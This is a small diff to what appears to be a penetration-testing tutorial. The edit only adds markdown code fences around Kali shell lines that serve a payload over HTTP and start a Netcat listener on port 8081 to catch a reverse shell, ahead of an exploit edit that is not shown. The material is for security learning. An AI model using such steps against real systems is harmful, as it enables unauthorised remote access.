@@ -366,7 +366,9 @@ We'll host our payload over HTTP.
 kali@kali:~$ sudo python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 Let's start a Netcat handler on port 8081 to catch our reverse shell.
+```
 
+```
 kali@kali:~$ nc -lvp 8081
 listening on [any] 8081 ...
 We'll modify the exploit as follows:
